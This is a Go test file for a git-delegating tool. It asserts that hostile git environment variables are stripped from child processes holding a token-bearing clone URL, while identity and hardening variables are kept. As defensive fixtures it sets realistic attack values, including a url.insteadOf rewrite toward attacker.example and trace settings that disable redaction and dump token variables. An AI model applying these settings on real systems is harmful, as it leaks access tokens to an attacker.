package mirror

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

// securityTest marks a test as one that locks a security invariant of
// goldfinger. It is a no-op at runtime; its only purpose is discoverability. See
// the fuller doc on the identical marker in apply/security_test.go
// (grep -rn 'securityTest(t)' --include='*_test.go' lists every security
// invariant test's call site across packages). Keep the two definitions
// identical.
func securityTest(t testing.TB) { t.Helper() }

// assertGitEnvScrubbed asserts a hostile git environment reached none of a
// delegate's child environment, and that the scrub did not overreach past the four
// families it covers. It exists in both packages because the exposure does: ghorg
// always execs git, and multi-gitter execs it under --git-type=cmd, which is what
// --sign=local selects — and neither ever sets cmd.Env, so git inherits whatever
// goldfinger built, with the PAT already in the clone URL it is being handed.
//
// Every name here is a STRING LITERAL, and deliberately NOT read from
// models.GitGrandchildEnvVars: that list holds PREFIXES, so a test that ranged
// over it would set variables literally called "GIT_TRACE*" and
// "GIT_CONFIG_KEY_*" — which no git build reads — and then assert that the things
// it had just invented were removed. The names below are real members a real git
// honours, chosen to span all four families: the tracing knobs that write the
// token-bearing argv to a path the host picked (including the switch that DISABLES
// redaction, the one that dumps other variables' values, and the pre-prefix
// spelling that only an exact-name entry catches), the config-injection channels
// that rewrite the remote, the transport knob that stops git checking who it is
// talking to, the six that point git at a repository other than the clone the
// delegate chose by setting cmd.Dir, and the three that make git serve content or
// ancestry the selected repository does not have.
//
// The survivors matter as much as the casualties. A prefix is the one scrub that
// can silently grow, so this pins its edges: GITHUB_ACTIONS proves the prefix is
// GIT_TRACE and not GIT; GIT_CONFIG_GLOBAL proves the config scrub is the injection
// channels and not GIT_CONFIG generally — that variable is where an operator's
// commit.gpgsign may live, so scrubbing it would silently unsign a run that
// announced --sign=local; GIT_AUTHOR_NAME is the identity git may have no other
// source for, so scrubbing it fails the commit outright in a CI-shaped environment;
// and GIT_TERMINAL_PROMPT=0 is what turns a bad credential into a fast failure
// instead of a delegate blocked on a prompt nobody can see. All four exclusions are
// argued in full on models.gitGrandchildEnvVars; asserting them here is what stops a
// later "while we're at it" widening from landing quietly.
func assertGitEnvScrubbed(t *testing.T, env []string) {
	t.Helper()
	for _, name := range []string{
		"GIT_TRACE",
		"GIT_TRACE2",
		"GIT_TRACE2_EVENT",
		"GIT_TRACE_CURL",
		"GIT_TRACE_REDACT",
		"GIT_TRACE2_ENV_VARS",
		"GIT_CURL_VERBOSE",
		"GIT_CONFIG_COUNT",
		"GIT_CONFIG_KEY_0",
		"GIT_CONFIG_VALUE_0",
		"GIT_CONFIG_PARAMETERS",
		"GIT_SSL_NO_VERIFY",
		"GIT_DIR",
		"GIT_WORK_TREE",
		"GIT_INDEX_FILE",
		"GIT_OBJECT_DIRECTORY",
		"GIT_ALTERNATE_OBJECT_DIRECTORIES",
		"GIT_NAMESPACE",
		"GIT_REPLACE_REF_BASE",
		"GIT_SHALLOW_FILE",
		"GIT_GRAFT_FILE",
	} {
		for _, e := range env {
			assert.NotContainsf(t, e, name+"=",
				"%s must be stripped: git is a grandchild here, handed the PAT inside the clone URL, and this variable makes it disclose that URL, send it to a host goldfinger never resolved, act on a repository other than the clone, or serve content the selected repository does not have", name)
		}
	}
	assert.Contains(t, env, "GITHUB_ACTIONS=keep-me",
		"the prefix is GIT_TRACE, not GIT — a scrub that eats GITHUB_* has overreached")
	assert.Contains(t, env, "GIT_CONFIG_GLOBAL=keep-me",
		"only the GIT_CONFIG_COUNT/KEY_n/VALUE_n/PARAMETERS injection channels are in scope; GIT_CONFIG_GLOBAL is where --sign=local's commit.gpgsign may live, and scrubbing it would silently unsign a run that announced signing")
	assert.Contains(t, env, "GIT_AUTHOR_NAME=keep-me",
		"the identity vars are announced rather than removed (doctor folds them into the reported identity); scrubbing them leaves git with no identity at all where the environment is the only source, and the commit fails")
	assert.Contains(t, env, "GIT_TERMINAL_PROMPT=0",
		"hardening switches are never scrubbed — removing GIT_TERMINAL_PROMPT=0 would let a bad credential hang a delegate on a prompt nobody can see")
}

// setGitHostileEnv exports the same names assertGitEnvScrubbed checks for, plus the
// survivors, so those assertions run against an environment that genuinely held
// every one of them — an assertion against a variable that was never set passes for
// free. Each hostile value is the shape the real attack takes, not a placeholder, so
// the test reads as the scenario it defends against. Kept beside its assertion, and
// identical in both packages, for the same reason the assertion is.
func setGitHostileEnv(t *testing.T) {
	t.Helper()
	for name, val := range map[string]string{
		"GIT_TRACE":                        "/tmp/goldfinger-hostile-trace.log",
		"GIT_TRACE2":                       "/tmp/goldfinger-hostile-trace.log",
		"GIT_TRACE2_EVENT":                 "/tmp/goldfinger-hostile-trace.log",
		"GIT_TRACE_CURL":                   "1",
		"GIT_TRACE_REDACT":                 "0",
		"GIT_TRACE2_ENV_VARS":              "GHORG_GITHUB_TOKEN,GITHUB_TOKEN",
		"GIT_CURL_VERBOSE":                 "1",
		"GIT_CONFIG_COUNT":                 "1",
		"GIT_CONFIG_KEY_0":                 "url.https://attacker.example/.insteadOf",
		"GIT_CONFIG_VALUE_0":               "https://oauth2:",
		"GIT_CONFIG_PARAMETERS":            "'url.https://attacker.example/.insteadOf=https://oauth2:'",
		"GIT_SSL_NO_VERIFY":                "false",
		"GIT_DIR":                          "/tmp/goldfinger-hostile-repo/.git",
		"GIT_WORK_TREE":                    "/tmp/goldfinger-hostile-worktree",
		"GIT_INDEX_FILE":                   "/tmp/goldfinger-hostile-index",
		"GIT_OBJECT_DIRECTORY":             "/tmp/goldfinger-hostile-objects",
		"GIT_ALTERNATE_OBJECT_DIRECTORIES": "/tmp/goldfinger-donor/.git/objects",
		"GIT_NAMESPACE":                    "hostile",
		"GIT_REPLACE_REF_BASE":             "refs/hostile-replace",
		"GIT_SHALLOW_FILE":                 "/tmp/goldfinger-hostile-shallow",
		"GIT_GRAFT_FILE":                   "/tmp/goldfinger-hostile-grafts",
		"GITHUB_ACTIONS":                   "keep-me",
		"GIT_CONFIG_GLOBAL":                "keep-me",
		"GIT_AUTHOR_NAME":                  "keep-me",
		"GIT_TERMINAL_PROMPT":              "0",
	} {
		t.Setenv(name, val)
	}
}
